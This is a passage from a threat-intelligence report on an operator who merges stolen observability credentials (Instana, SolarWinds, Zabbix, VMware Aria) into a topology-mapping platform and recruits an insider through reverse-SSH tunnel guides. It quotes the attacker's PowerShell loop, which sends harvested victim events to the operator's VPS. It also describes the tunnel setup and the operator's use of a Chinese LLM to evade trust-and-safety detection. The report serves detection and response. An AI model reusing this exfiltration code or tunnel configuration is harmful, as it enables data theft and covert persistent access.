The ARPA platform sits on operator-OWNED DigitalOcean infrastructure at 209.38.205.158 (Frankfurt), alive at investigation date 2026-05-24. A connector arrow continues down to an outcome card with a deep-red side-rail (endgame): a 7,552-element unified topology graph of the victim organization's internal infrastructure with 1,859 hosts cross-correlated and partner-ecosystem visibility across several regulated-sector partners (two state banks, a pension-fund operator, and three insurance-sector regulators) and the victim subsidiary. The outcome card emphasizes that the operator's view is comparable to a privileged internal admin without ever compromising a single victim endpoint, and that the credential-rotation timeline IS the remediation timeline. Footer detection anchor: multi-platform cross-source authentication from the same source IP within a short window is diagnostic for the TTP class (Sigma rule 7 + Suricata rule 2 in the linked detection file).">
  <figcaption><em>Figure 1: Observability-Tool Reverse Pipeline — the headline novel TTP for Case 2 visualized. Four stolen monitoring credentials (IBM Instana 10-year JWT, SolarWinds Orion service account, Zabbix admin token, VMware Aria API access) converge into the operator's ARPA cross-source ETL platform, producing a 7,552-element unified topology graph of the victim organization's internal infrastructure with partner-ecosystem visibility. The TTP class is diagnostic via multi-platform cross-source authentication detection (Sigma rule 7 + Suricata rule 2) — defenders should treat monitoring-platform credentials as crown-jewel-class secrets.</em></figcaption>
</figure>

#### Deep Technical Analysis

The four stolen credential sources are documented per-source below.

**Source 1: IBM Instana commercial APM (10-year JWT).**

The captured JWT carries:

| JWT claim | Value | Significance |
|---|---|---|
| `jti` (token ID) | `022a1b74-2332-4df5-a76b-60225ffa7ae3` | Unique token identifier; highest-signal YARA detection string |
| `tenant` | `[victim-tenant]` | Victim identification anchor |
| `iat` (issued at) | 2024-03-06 | Token issuance date |
| `exp` (expiration) | approximately 2034-02 | 10-year token lifetime — the credential governance defect |
| Endpoint | `ocpinstana.[victim-domain].com.tr` | Victim's IBM-hosted OCP Instana tenant URL |

Operator usage pattern (from `topology_mapper.py` and `instana_collector_v4.py`): HTTP GET against `https://ocpinstana.[victim-domain].com.tr/api/applications` with `Authorization: apiToken <REDACTED-JWT>` header, plus polling against `/api/events?from=<TS>&to=<TS>&limit=100` in a sliding-window pattern. PowerShell collector version (`turkish-instana_local_collector.ps1`) uses `Invoke-RestMethod -SkipCertificateCheck` — the TLS validation skip is consistent with an insider-deployed script targeting an internal endpoint (MODERATE-confidence interpretation: two plausible drivers are a self-signed internal certificate chain or operational concealment by suppressing TLS-validation-failure audit-log signals; both interpretations align with the script's insider-execution profile).

The 10-year JWT lifetime is the central credential governance defect. IBM Instana does not enforce a maximum token lifetime by default; the customer (the victim organization in this case) is responsible for setting rotation policy. The captured JWT was issued in March 2024 and the operator obtained it at some unknown point between then and the campaign's first observed activity (March 2026). The token has not been rotated despite the operator using it continuously for 73+ days of documented activity. This is a customer-side governance failure, **not** an IBM Instana product CVE.

**Source 2: SolarWinds Orion.**

Captured topology data: 784 nodes, 6,566 interfaces, full network monitoring telemetry for the victim organization's network infrastructure. Filename in operator data: `solarwinds_topology_20260312_1015.json` (timestamp embedded indicates a 2026-03-12 capture). No evidence in captured files indicates a SolarWinds Sunburst supply-chain compromise — the operator's access pattern is stolen-service-account-credential abuse against a legitimate SolarWinds Orion deployment, not exploitation of a backdoored binary.

**Source 3: Zabbix.**

Captured topology data: 100 victim hosts. Filename: `zabbix_topology_20260312_2058.json` (later same-day capture). Zabbix admin or read-only credential is the access vector; the exact credential value is not captured in operator code as cleartext (HIGH-confidence interpretation: token is held in environment variables or external config not enumerable from the open directory — consistent with the operator's pattern observed across the other three sources).

**Source 4: VMware Aria (vCenter / ESXi monitoring).**

Captured event volume in sampled window: 8,649 events. Captured cluster identification: events span three internal-domain spaces — a production Active Directory domain, a separate Linux-estate domain, and a likely VMware-managed cluster domain (specific internal-domain names suppressed from the public report body). Credential access likely via VMware Aria's API to vCenter; specific credential capture not in operator code as cleartext.

**Cross-source unified topology graph.**

The four sources are ingested into the unified Neo4j topology graph (`unified_cross_source_topology.json` is the operator's cached export). The graph spans **7,552 elements**: 1,859 hosts (the same 1,859 that the AI/ML anomaly-detection modules run over) + topology relationships (host-to-host, host-to-application, application-to-application) + the cross-source correlation links (this Instana service ID corresponds to this SolarWinds node ID corresponds to this Zabbix host ID).

#### Executive Technical Context

**What This Means:** Imagine an espionage operative who steals four different sets of master keys to a building: the architectural blueprints (SolarWinds Orion network topology), the elevator-system maintenance schedule (Zabbix host monitoring), the security-camera footage indexing (Instana application performance monitoring), and the climate-control system access (VMware Aria virtualization monitoring). Individually, each stolen key is bad. Combined and cross-correlated, the operative now has a real-time integrated view of the entire building — who works where, what systems are running, when traffic peaks happen, where the weak points are — without ever needing to physically enter the building. The ARPA platform does this for digital infrastructure.

**Business Impact:** The operator does not need to compromise a single victim endpoint to maintain real-time intelligence on the victim's entire internal infrastructure. As long as the four observability credentials remain valid, the operator's visibility into the victim is comparable to a privileged internal administrator's view. The credential-rotation timeline IS the remediation timeline.

**Detection Strategy:** The single highest-value defender query is multi-platform cross-source authentication monitoring — same source IP authenticating against multiple monitoring platforms in a short time window. See `Sigma rule 7` and `Suricata rule 2` in the linked detection file. This detection is diagnostic for the broader Observability-Tool Reverse Pipeline TTP class, not specific to this operator.

**Novelty Status (Calibration):** Observability-Tool Reverse Pipeline novelty MAINTAINED at high-MODERATE (top of MODERATE band) after full prior-art review. The closest documented adjacent (UNC6395 OAuth-based Salesforce CRM breach, August 2025) is structurally distinct: that case was one-time mass exfiltration across 700+ tenants, not sustained 4-source ETL against a single named tenant. The SolarWinds Sunburst case (MITRE Campaign C0024, December 2020) is not comparable — Sunburst is supply-chain backdoor injection into the vendor's update infrastructure, not stolen-credential reverse pipeline. The "cannot exclude classified / paid-corpus prior art" qualifier remains (Recorded Future / Mandiant Advantage / Intel471 paid intelligence platforms were not reviewed for this assessment).

### 4.3 OpenClaw Weaponization (Chinese Commercial AI Platform → ARPA Harvester)

> **Analyst note:** This subsection covers the operator's adoption of the OpenClaw AI agent platform as the upstream substrate for the ARPA harvester. OpenClaw is a Chinese commercial AI agent CLI similar to Anthropic's Claude Code or Atlassian's Rovodev. Understanding the OpenClaw connection matters because it shows the operator deliberately selected a non-Western AI tool — a Trust-and-Safety-evasion choice consistent with awareness that Western AI providers (Anthropic, OpenAI, Google) maintain abuse-detection programs and the operator's activity would likely trigger them.

#### Deep Technical Analysis

The operator host shows two co-located OpenClaw-related artifacts: `~/.openclaw/` (the active OpenClaw configuration directory in the operator's current installation) and `~/.clawdbot/` (an artifact of an earlier OpenClaw naming convention before the platform rebranded). Both directories indicate the operator tracked the platform's naming transitions and migrated state across them.

OpenClaw is documented in CrowdStrike enterprise analysis (Tier-2 source) and Red Canary's malicious AI detection blog as a Chinese AI agent CLI gaining adoption among threat actors who want LLM-augmented operational workflows but want to avoid Western-vendor Trust-and-Safety detection. Red Canary's framework "Living Off the AI Land" (LOTAIL) applies directly to this operator's pattern.

The ARPA platform-specific OpenClaw integration is at the AI service layer (`ai_service.py` and `ai_assistant.db` — covered in detail in subsection 4.6) where the operator wires OpenClaw's natural-language interface over the unified-topology Instana event data. The LLM backend is Moonshot AI's Kimi rather than Anthropic / OpenAI / Google.

Co-located offensive tooling that discriminates the operator host from legitimate OpenClaw developer environments: `arpa_*.sh` shell scripts and the full `/opt/ARPA/` filesystem tree. A legitimate OpenClaw developer environment would not co-locate `~/.openclaw/` with `arpa_*.sh` shell scripts and a custom 5-daemon production analytics platform.

#### Executive Technical Context

**What This Means:** The operator chose a Chinese-jurisdiction AI provider rather than a Western AI provider. The choice is operationally meaningful: Western AI providers (Anthropic, OpenAI, Google) actively run Trust-and-Safety programs that would likely detect and disable an account being used for offensive intelligence-analysis-over-stolen-victim-telemetry. Chinese AI providers historically have different threat-intelligence-cooperation profiles with Western threat-intel community; the operator's account binding to Moonshot AI / Kimi is therefore less likely to be disrupted by Western T&S coordination.

**Business Impact:** The defender takeaway is not "block OpenClaw" or "block Kimi" — neither tool is inherently malicious and both have legitimate developer use cases. The defender takeaway is: **the AI vendor selected by an operator is itself an attribution signal**. An operator using Moonshot AI Kimi over a Western LLM is making a tradecraft choice consistent with awareness that Western T&S coordination is a defender lever.

### 4.4 Insider Recruitment Artifact

> **Analyst note:** This subsection covers the second publication-defining novel finding: an operator-recruited insider inside the victim's Active Directory environment, with operator-authored Turkish-language documentation instructing the insider how to deploy a reverse-SSH tunnel. The insider's specific Windows AD user identifier is suppressed from this public report per operational-sensitivity protocol; the full identifier is in the offline FULL evidence briefing for victim-coordination use only. The structural rarity of this finding is the four-factor combination: third-party detection precedes victim detection + single specific state-affiliated corporate victim + named individual insider identifiable from operator artifacts + 70+ day gap before presumed victim awareness.

#### Deep Technical Analysis

The operator's open directory contains **eight Turkish-language Markdown documents** authored by the operator and addressed to a named victim-organization Windows AD user (identifier suppressed). The documents are setup and troubleshooting guides for deploying a reverse-SSH tunnel from the insider's Windows workstation back to the operator VPS.

Document filenames (visible in operator filesystem):

| Filename (visible) | Language | Purpose |
|---|---|---|
| `PUTTY_TUNNEL_DETAY.md` | Turkish | Detailed PuTTY tunnel configuration (the most comprehensive setup document) |
| `TUNNEL_RESTART.md` | Turkish | Tunnel restart procedure for when the connection drops |
| `WINDOWS_VPN_TUNNEL.md` | Turkish | Windows-specific networking notes |
| `SSH_KEY_COZUM.md` | Turkish | SSH key troubleshooting (the Turkish word "çözüm" means "solution") |
| (4 additional Markdown files) | Turkish | Additional setup, troubleshooting, and operator-to-insider handoff guidance |

Tunnel architecture (documented in PUTTY_TUNNEL_DETAY.md):

```
Operator VPS (209.38.205.158) ─── port 18080 (operator-side) ──┐
                                                                ├── reverse-SSH tunnel
Insider Windows workstation ───── localhost:8089 ──────────────┘
PuTTY saved session: "ARPA_Tunnel"
SSH keys: rca_key.ppk (PuTTY format) + rca_key.pem (OpenSSH format)
```

The tunnel allows the operator to reach an internal-network service running on `localhost:8089` of the insider's workstation by connecting to port 18080 on the operator VPS. The architecture preserves operator anonymity (the operator never directly connects to the victim network) and provides persistence independent of the four stolen observability credentials (if the credentials are rotated, the tunnel persists; if the tunnel is severed, the credentials persist).

Operator-supplied SSH keys (`rca_key.ppk` for PuTTY use and `rca_key.pem` for ssh-client use) reference an earlier project naming convention — `rca` for "Root Cause Analysis," matching the operator's earlier `/opt/rca-platform/` project path. The key naming convention is internally consistent with the operator's project naming history.

#### Executive Technical Context

**What This Means:** The operator did not just steal four observability credentials remotely — the operator also recruited (or possibly deceived, coerced, or compromised the account of) an individual inside the victim organization. That insider has been given an SSH private key by the operator, instructed in Turkish how to deploy a reverse-SSH tunnel from their Windows workstation back to the operator's server, and provided a saved PuTTY session name (`ARPA_Tunnel`) to use. This is the operator establishing an in-network access path independent of the stolen API tokens.

**Business Impact:** Standard incident response that focuses only on the stolen credentials will miss the insider tunnel completely. Even after all four observability credentials are rotated, the operator retains potential in-network access via the insider tunnel — until the insider's workstation is forensically reviewed and the operator-supplied SSH keys removed.

**Insider Intent Classification:** The insider's intent (cooperative, coerced, deceived, or compromised-account-without-knowledge) **cannot be determined from external evidence**. Each scenario has different organizational and legal implications:

- **Cooperative insider:** intentionally collaborating with the operator. This is the highest-severity scenario but is unprovable externally.
- **Coerced insider:** under threat or duress from the operator. This requires the operator to have communicated threats; the captured Turkish-language documentation is purely operational with no coercive content visible.
- **Deceived insider:** believes the operator is a legitimate vendor or consultant (the "Read-Only Compliance" framing in the ARPA dashboard footer would support this deception narrative).
- **Compromised-account insider:** the named Windows AD account has been compromised by the operator and the human user associated with the account is unaware of the operator-controlled access. In this scenario, the documentation would have been authored for an operator-controlled session under the named user's identity (LOW-confidence scenario classification — requires victim-side forensic access to confirm or rule out, as listed in the next paragraph).

Determining which scenario applies requires victim-side forensic access — interviewing the named user, reviewing their workstation forensic state, reviewing their email and chat history for operator contact, and verifying whether they recognize the PuTTY session name or the SSH keys. This investigation must be handled with appropriate legal/HR coordination given the insider-in-chain sensitivity.

**Detection Strategy:** See `Sigma rule 9` (Markdown files with Turkish-language tunnel-setup naming convention in user-profile directories) and `Sigma rule 10` (PuTTY saved session named `ARPA_Tunnel` or SSH outbound to `209.38.205.158:22`) in the linked detection file.

**Structural Rarity Confirmation:** The 2024-2026 published corpus on insider threats was reviewed during research and contains no case combining all four structural factors of this finding (third-party detection first + single specific state-affiliated corporate victim + named individual insider identifiable from operator artifacts + 70+ day victim-awareness gap). Rippling/Deel (2025), Coinbase (2025), and other insider-threat reference cases are internal-detection-first events with comparable insider dimensions but lack the third-party-first detection structural rarity. This finding is publication-defining.

### 4.5 Cross-Source ETL + 7,552-Element Unified Topology

> **Analyst note:** This subsection covers how the operator-built ETL pipeline merges data from the four stolen observability sources into a single unified topology graph. The technical depth matters because the unified graph is what makes the operator's intelligence-collection productive — without cross-source correlation, the operator would have four disconnected datasets; with cross-source correlation, the operator has an integrated view of the victim's internal infrastructure.

#### Deep Technical Analysis

The ETL pipeline runs continuously via `arpa-parallel.service` (parallel worker daemon) coordinating with `arpa-daemon.service` (primary collector orchestrator). Polling cadence is 5 minutes per source. Per-poll workflow:

1. Each source-specific collector module (`topology_mapper.py` for Instana, plus the SolarWinds / Zabbix / VMware Aria collector modules — only the Instana module is fully recovered from open directory) authenticates with stolen credentials and pulls the source-specific data.
2. Raw source data lands in TimescaleDB (time-series) and is normalized by the source-specific normalization layer (Turkish-language docstrings throughout — see `topology_mapper.py`: "Service label'ından host bilgisi çıkar" = "Extract host info from Service label").
3. Cross-source correlation logic in `correlation_v3.py` ("ARPA Korelasyon Motoru v3 - Temporal Focus") merges per-source host records via host-identifier matching (FQDN normalization across the victim's internal AD, Linux-estate, and VMware-cluster domains) and writes the merged topology to Neo4j.
4. The Neo4j unified-topology graph is exported on demand to `unified_cross_source_topology.json` and is the data backing for the dashboard at port 8090.

The unified topology contains:

- 1,859 unique hosts (same set that the AI/ML anomaly-detection modules operate over)
- Topology relationships at host-to-host, host-to-application, and application-to-application granularity
- Cross-source correlation links explicitly mapping Instana service IDs ↔ SolarWinds node IDs ↔ Zabbix host IDs ↔ VMware Aria entity IDs
- Total element count: 7,552

#### Executive Technical Context

**What This Means:** The operator can ask the unified-topology graph questions that no single observability tool can answer alone (HIGH-confidence assessment: the four sources cover non-overlapping data domains — Instana = application identification, SolarWinds = network connectivity, Zabbix = host metrics, VMware Aria = virtualization events — so any question spanning ≥2 of these domains is structurally outside any single source's capability). For example: "What hosts are running OpenDental-class applications, are network-connected to the victim organization DMZ, and have shown anomalous CPU patterns in the last 72 hours?" That question requires Zabbix (CPU monitoring) plus SolarWinds (network connectivity) plus Instana (application identification) plus the operator's own anomaly-detection (anomaly flagging) — all four sources merged. The unified topology makes such queries one-step instead of four-step manual reconstruction.

**Business Impact:** From a defender's perspective, the unified topology IS the operator's intelligence product. Remediation must include not just rotating the four stolen credentials but also recognizing that the operator has the unified-topology export cached in their VPS — even after credential rotation, the operator retains the snapshot view of victim infrastructure that existed up to the rotation moment.

### 4.6 AI-Augmented Infrastructure Reconnaissance Using Stolen APM Credentials (CANDIDATE Novel TTP, N=1)

> **Analyst note:** This subsection covers the campaign's CANDIDATE novel TTP — an LLM-backed natural-language query interface over stolen victim telemetry. The architectural intent is documented in operator filesystem (`ai_service.py` + `ai_assistant.db`); the operational state at investigation time is best characterized as broken / development-stage rather than production. The TTP is CANDIDATE because it requires N≥2 cross-operator validation before upgrading to confirmed-novel status; the architectural pattern is straightforward to replicate, so confirmation is expected to arrive on a months-to-quarters horizon once the pattern enters public threat-intel awareness (MODERATE-confidence timeline projection based on the replicability of the LLM-over-stolen-telemetry architecture).

#### Deep Technical Analysis

The AI service is implemented in `ai_service.py` (Python). Three companion files frame the architecture:

| File | Role |
|---|---|
| `ai_service.py` | HTTP endpoint exposing the natural-language query interface |
| `ai_assistant.db` | SQLite database storing query history, prompt templates, and operator-cached responses |
| `data_retrieval.py` | Retrieval layer fetching unified-topology context for LLM prompt construction (RAG pattern) |

The LLM backend is **Moonshot AI's Kimi** rather than a Western LLM. The operator's `IDENTITY.md` file content references the Moonshot platform for the LLM provider. The architectural pattern is Retrieval-Augmented Generation (RAG): natural-language query from operator → retrieval layer fetches relevant topology context from Neo4j and event context from TimescaleDB → context + query packaged into LLM prompt → LLM returns natural-language summary or analysis → response cached in `ai_assistant.db`.

Architectural intent (inferred from code structure):

1. Operator asks the AI service a natural-language question about the victim's infrastructure (in English or Turkish).
2. The retrieval layer fetches relevant context from the unified topology graph and recent event stream.
3. The LLM is prompted with the context + the question and asked to produce an analyst-style answer.
4. The operator receives the answer plus citation links back to specific topology elements or events.

Operational state at investigation time: the AI service code is present but the operator's query history in `ai_assistant.db` is sparse, suggesting the service is dev-stage rather than production. Several code paths reference TODOs and incomplete error-handling. The architectural intent is clear; the operational maturity is incomplete.

#### Executive Technical Context

**What This Means:** This is the operator wiring an LLM into an intelligence-analysis pipeline over stolen victim telemetry — the LLM acts as a junior intelligence analyst summarizing the operator's stolen data into natural-language reports. Three other AI-offensive patterns appear in the parent investigation (AI-generated code, AI workflow orchestration, AI permission-allowlist customization); this is a structurally distinct fourth pattern.

**Business Impact:** The forward-looking defender takeaway is that the architectural pattern is straightforward to replicate. The technical complexity is in the underlying stolen-credential abuse and the cross-source ETL (subsections 4.2, 4.5) — wiring an LLM as a natural-language summary layer over already-stolen telemetry is the relatively easy part. As more operators steal observability credentials, more operators will wire LLMs over the stolen data. Defender preparation for the broader class is warranted now even though only one example is currently documented.

**Novelty Status:** CANDIDATE novel TTP at N=1. Cross-operator validation at N≥2 is required before upgrading to confirmed-novel. The Sigma rule 11 in the linked detection file targets the egress pattern (operator host outbound to Moonshot AI / Kimi API endpoints, paired with the unified-topology data retrieval pattern) for hunt-purposes detection.

### 4.7 Ecosystem Partner Expansion (Notification Scope, NOT Separate Compromises)

> **Analyst note:** This subsection covers the six ecosystem-partner entities (several regulated-sector partners) and one subsidiary ([victim subsidiary]) that appear in operator data. The most important point is the framing: these are **partner-notification scope**, not separate compromises. They appear because they are integrated with the victim organization's own observability monitoring, not because the operator has stolen their credentials.

#### Deep Technical Analysis

Within the operator's 43-application Instana access set, the following partner-entity application snapshots are present:

| Entity | Snapshot evidence | Classification |
|---|---|---|
| A major Turkish state bank | ~85 KB application snapshot — disproportionately large for selective deep-dive | Ecosystem-partner integration; selective focus consistent with sanctions-related geopolitical-leverage targeting interest |
| A second major Turkish state bank | Application snapshot present in operator data | Ecosystem-partner integration via the victim organization payment / banking flows |
| A Turkish pension-fund operator | Application snapshot present in operator data | Ecosystem-partner integration (pension fund) |
| An insurance-data regulator | Application snapshot present in operator data | Turkish insurance regulatory data integration |
| An agricultural-insurance pool regulator | Application snapshot present in operator data | Turkish agricultural-insurance regulatory integration |
| A natural-disaster-insurance regulator | Application snapshot present in operator data | Turkish natural-disaster-insurance regulatory integration |
| The victim subsidiary | Application snapshot present in operator data | the victim organization subsidiary |

The selective deep-dive size (~85 KB for the major-state-bank snapshot, vs typical ~5–10 KB per other partner application snapshot) is the operationally interesting selective-focus signal.

#### Executive Technical Context

**What This Means:** the victim organization's monitoring stack monitors the partners' integration endpoints — when a partner's API responds to a victim-organization query, Instana logs the application performance metric. By stealing the victim organization's Instana JWT, the operator gains visibility into the integration-endpoint behavior of the partners as observed from the victim organization's side. The operator does NOT gain access to the partners' own internal infrastructure, nor to their own observability stacks, nor to their own credentials.

**Business Impact:** The partner entities should be notified that they appear as integration endpoints in the operator's stolen-telemetry dataset, **but they are not compromised in their own infrastructure**. Their notification is downstream of the victim organization's own remediation. Mischaracterizing the campaign as a 7-victim compromise will mislead defender allocation.

**Selective Partner Targeting:** The disproportionate deep-dive into one partner — a major Turkish state bank with well-documented, sanctions-related geopolitical exposure — is consistent with a specific intelligence-collection interest in that institution rather than ordinary financial crime. It is the strongest evidence supporting the state-aligned-or-political sub-type classification for the operator's motivation.

### 4.8 Multi-Platform Operator Infrastructure

> **Analyst note:** This subsection covers the operator's own infrastructure: the DigitalOcean VPS hosting the ARPA platform, the residential Turkish ISP source IP captured during an active operator session, the Moonshot AI / Kimi LLM provider, and the public GitHub repository. The infrastructure choices are themselves attribution signals.

#### Deep Technical Analysis

| Infrastructure | Provider / Detail | Role |
|---|---|---|
| Operator VPS | `209.38.205.158` on DigitalOcean Frankfurt (AS14061) | ARPA platform host; 5 systemd daemons; 4 data persistence backends; HTTP services on ports 8090 (dashboard), 8095 (unified-topology API), 8096 (Instana ingestion API), 8089 (reverse-SSH tunnel target) |
| Operator source IP | TurkNet AS12735 (Turkish residential / SMB ISP, Istanbul area) — specific IP suppressed from public report body | Operator's interactive source captured during active session 2026-05-20 21:22–21:30 UTC = late-evening Turkish local time |
| LLM provider | Moonshot AI / Kimi | Chinese-jurisdiction LLM provider chosen over Western LLMs (Anthropic, OpenAI, Google) — Trust-and-Safety-evasion tradecraft |
| GitHub repository | Operator-controlled public GitHub repository (URL suppressed from public report body per operational-sensitivity protocol) | Public repository hosting ARPA-related code; **account suspended by GitHub T&S 2026-05-25** — repository no longer accessible |
| AI agent platform | OpenClaw | Chinese commercial AI agent CLI; substrate for the ARPA platform's AI service layer |

DigitalOcean Frankfurt was likely selected for low-latency access from Istanbul (~40–60 ms RTT to Frankfurt) rather than for abuse tolerance — DigitalOcean is a legitimate Tier-1 commercial cloud provider with a cooperative abuse desk and published transparency reports. Takedown of `209.38.205.158` is administratively feasible via DigitalOcean's abuse desk.

TurkNet was likely the operator's home or workplace ISP rather than a deliberate jurisdictional choice. The lack of VPN / Tor masking is consistent with either OPSEC failure or non-professional individual operator pattern; subscriber-record disclosure via Turkish law enforcement (SECRD Cybercrime Combat Department) subpoena to TurkNet is operationally feasible if Turkish LE is engaged via USOM. The 2025 TurkNet breach disclosure (2.8M records affected) creates a separate question about subscriber-record evidentiary integrity that is unresolved at investigation date.

#### Executive Technical Context

**What This Means:** The operator's infrastructure choices reveal a deliberate pattern: production cloud hosting for the platform (DigitalOcean Frankfurt) + non-anonymized residential ISP for the operator's interactive source (TurkNet) + non-Western LLM provider (Moonshot AI Kimi) + public GitHub repository (a deliberate naming-the-codename choice). The first three are tradecraft choices; the fourth is OPSEC failure.

**Business Impact:** The defender takeaway for cloud-provider abuse coordination is that the operator's VPS is on a legitimate cooperative provider — takedown is administratively feasible. The defender takeaway for attribution is that the operator's source IP, ISP, and GitHub footprint together provide multiple identity-anchor paths for law-enforcement engagement.

---

## 5. Static Analysis

> **Analyst note:** This section walks through the static code analysis of the three artifact classes recovered from the operator's open directory: the victim-side PowerShell collector script (designed for insider deployment on a victim-organization workstation), the ARPA platform Python source code (the operator's analytics platform), and the Turkish-language Markdown operator notes (the insider-recruitment documentation). Static analysis means examining the code without running it — the goal is to extract the operator's intent and architectural decisions from what they wrote, not from what the code does at runtime.

### 5.1 PowerShell Collector Script (`turkish-instana_local_collector.ps1`)

The PowerShell collector is a single script designed for execution by the insider on a victim-organization Windows workstation. Static walkthrough of the script's structural sections:

**Header / comment block (Turkish):**

```powershell
# Bu script local Windows makinede çalışır ve event'leri ARPA sunucusuna gönderir
# (This script runs on local Windows machine and sends events to ARPA server)
```

The Turkish header comment is itself an attribution-anchor signal — operator-authored Turkish-language documentation embedded in operational code intended for insider use. The phrase `ARPA sunucusuna` ("to the ARPA server") embeds the operator's self-branding into the victim-side artifact.

**Authentication block:**

```powershell
$apiToken = "<REDACTED-JWT>"  # tenant=[victim-tenant], jti=022a1b74-...-7ae3
$instanaUrl = "https://ocpinstana.[victim-domain].com.tr"
$headers = @{ "Authorization" = "apiToken $apiToken" }
```

The stolen 10-year JWT is hardcoded into the PowerShell script. The `Authorization: apiToken <JWT>` header format matches IBM Instana's documented API authentication scheme. The endpoint URL is the victim's own production Instana tenant.

**Polling loop:**

```powershell
while ($true) {
    $events = Invoke-RestMethod -Uri "$instanaUrl/api/events?from=$fromTs&to=$toTs&limit=100" `
                                -Headers $headers `
                                -SkipCertificateCheck
    Invoke-RestMethod -Uri "http://209.38.205.158:8096/api/ingest/instana" `
                      -Method POST `
                      -Body ($events | ConvertTo-Json -Depth 10) `
                      -ContentType "application/json"
    Start-Sleep -Seconds 300  # 5-minute cadence
}
```

Three operationally significant observations:

1. **TLS validation skip (`-SkipCertificateCheck`).** Used when calling the victim's own Instana endpoint. The skip reduces risk-of-failure indicators in audit logs if the victim's internal certificate chain is unstable, but it is also a tell — legitimate the victim organization administrative PowerShell would normally validate the chain. Detection rule: PowerShell `Invoke-RestMethod` with `-SkipCertificateCheck` AND URL containing `ocpinstana.[victim-domain].com.tr` is a near-zero-FP signature (Sigma rule in linked detection file).
2. **Cleartext HTTP egress to operator VPS.** The collector POSTs harvested events to `http://209.38.205.158:8096/api/ingest/instana` over **cleartext HTTP** — not HTTPS. This is a deliberate operator architectural choice (the ingestion endpoint is unauthenticated and uses HTTP-only; covered in dynamic analysis Section 6) and is detectable at the network egress layer.
3. **5-minute polling cadence (`Start-Sleep -Seconds 300`).** Aligns with the operator-side 5-minute systemd daemon polling cadence. The combined effect is that observability data flows from victim → operator with at most 5 minutes of staleness.

### 5.2 ARPA Platform Python Source Code

The ARPA platform Python source comprises approximately 780 files in the operator's open directory. The 12 DEFINITE-confidence SHA256-tracked files in the linked IOC feed are the most operationally significant operator modules (a 13th MODERATE-confidence hash covers the ecosystem-template `SOUL.md`). Static analysis highlights from the core modules:

**`correlation_v3.py` opening docstring (operator self-branding):**

```python
"""ARPA Korelasyon Motoru v3 - Temporal Focus"""
```

The opening docstring uses the operator's self-branded codename in the most prominent code position. The "v3" version marker and "Temporal Focus" qualifier indicate the operator has iterated this module through at least three major architectural revisions — consistent with sustained 73+ day development tempo. Detection rule: this docstring is a near-zero-FP YARA signature (YARA rule 1 in linked file).

**`topology_mapper.py` Turkish docstring excerpt:**

```python
# Service label'ından host bilgisi çıkar
# (Extract host info from Service label)
```

Turkish docstring embedded in operational Python code. The mixed-language register (Turkish operational comment + English-language API tokens) is a consistent operator signature — present across multiple modules.

**`api_correlation_routes.py` endpoint dispatch:**

```python
elif self.path.startswith("/api/correlations/"):
    # operator-distinctive correlation endpoint
    ...
```

The `/api/correlations/` endpoint path is operator-distinctive and is exposed on the dashboard at port 8090. Detection signature for SOC monitoring.

**`add_corr_endpoints.py` operator emoji-in-output bleed:**

```python
print('✅ API endpoints added')
```

The operator uses emoji glyphs in development output across multiple modules. Other examples: the dashboard footer "Mock Data: ❌" and additional Turkish-language status messages such as `print('=== SON 5 KORELASYON ===')` ("=== LAST 5 CORRELATIONS ==="). The emoji-in-output pattern is a consistent operator tradecraft signature.

**`ai_service.py` LLM provider binding:**

The `ai_service.py` module wires Moonshot AI / Kimi as the LLM backend rather than a Western LLM. The provider binding is explicit in the API key environment variable name and the endpoint URL referenced in the module's HTTP client configuration. The architectural intent (RAG over unified-topology data) is documented in the module's docstrings; the operational state at investigation time is dev-stage rather than production.

**Systemd unit naming convention:**

The five systemd unit files use a consistent `arpa-*.service` naming convention:

- `arpa-autolearn.service` — AI/ML anomaly-detection runner
- `arpa-continuous.service` — continuous-mode polling daemon
- `arpa-daemon.service` — primary collector daemon
- `arpa-instana-api.service` — HTTP API endpoint exposure
- `arpa-parallel.service` — parallel cross-source ETL worker

The naming is internally consistent and operator-authored. Detection rule: creation of any systemd unit file matching `arpa-*.service` is a high-signal indicator (Sigma rule in linked detection file).

### 5.3 Turkish-Language Operator Notes (Insider Recruitment Documentation)

The eight Turkish-language Markdown operator notes are structurally documentation rather than code. Static walkthrough of the most operationally significant document (`PUTTY_TUNNEL_DETAY.md`):

The document walks the insider through PuTTY tunnel setup in numbered Turkish-language steps: configure the SSH connection to `209.38.205.158:22`, load the saved session named `ARPA_Tunnel`, configure the reverse tunnel mapping port `18080` (remote) to `localhost:8089` (local), authenticate using the operator-supplied `rca_key.ppk` private key, and verify the tunnel is established by checking that traffic flows from operator → insider workstation localhost:8089.

The document content is purely operational with no coercive language visible. The instructional register (numbered steps, screenshot annotations, troubleshooting tips) is consistent with operator-to-cooperating-insider documentation, but is also consistent with operator-to-deceived-insider (where the operator presents themselves as a legitimate vendor providing a "remote access tool" for compliance reasons). Insider intent classification cannot be determined from the documentation alone.

The `SSH_KEY_COZUM.md` ("SSH Key Solution") document walks through SSH key troubleshooting — when the `rca_key.pem` file does not authenticate, the document instructs the insider on how to convert between PuTTY (`.ppk`) and OpenSSH (`.pem`) formats. The depth of troubleshooting documentation (eight separate documents) is consistent with sustained operator-to-insider interaction over multiple days or weeks.

**Filename pattern:** The eight documents follow Turkish-language uppercase naming convention (`PUTTY_TUNNEL_DETAY.md`, `TUNNEL_RESTART.md`, `WINDOWS_VPN_TUNNEL.md`, `SSH_KEY_COZUM.md`, plus four additional). Detection rule: Markdown file creation in user-profile directories matching the Turkish-language uppercase pattern `(GERCEK|PUTTY|SSH|TUNNEL|WINDOWS)_*.md` is a hunt-purposes signature (Sigma rule in linked detection file).

---

## 6. Dynamic / Behavioral Analysis

> **Analyst note:** This section presents the chronological behavior of the ARPA platform during a single 5-minute polling cycle, plus the insider-deployment behavior and the AI-augmented query interface behavior. Dynamic analysis is normally a sandbox-based observation of a malware sample at runtime; in this case, the platform is operator-hosted (not victim-side) so the "dynamic" view is reconstructed from observed operator filesystem state, captured HTTP service responses on the open directory, and the daily-topology log that the operator generated.

### 6.1 ARPA Platform 5-Minute Polling Cycle (Chronological)

The polling cycle is the operational heartbeat of the ARPA platform. Reconstructed sequence per 5-minute cycle:

**T+0:00** — `arpa-daemon.service` orchestrator wakes and triggers the four per-source collector modules in parallel via `arpa-parallel.service`.

**T+0:00 to T+0:30** — Four parallel HTTP requests are issued from operator VPS:

| Source | Endpoint | Authentication |
|---|---|---|
| Instana | `https://ocpinstana.[victim-domain].com.tr/api/events?from=<TS>&to=<TS>&limit=100` | `Authorization: apiToken <stolen-JWT>` |
| SolarWinds Orion | Orion API endpoint (specific URL captured in operator code) | Stolen service-account credentials |
